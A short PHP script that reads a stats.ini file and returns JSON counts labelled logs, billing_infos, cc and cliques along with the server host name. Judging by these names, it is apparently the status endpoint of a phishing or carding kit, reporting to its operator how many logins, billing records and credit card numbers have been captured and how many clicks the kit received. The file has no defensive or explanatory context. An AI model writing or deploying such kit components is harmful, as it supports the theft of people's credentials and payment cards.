<?php 
$filepath = './info/send/stats.ini';
$data = @parse_ini_file($filepath);

echo '{"ls":"'.$data['logs'].'","bs":"'.$data['billing_infos'].'","cs":"'.$data['cc'].'","hst":"'.$_SERVER['HTTP_HOST'].'","hstcnt":"'.$data['cliques'].'"}' 
  
 ?>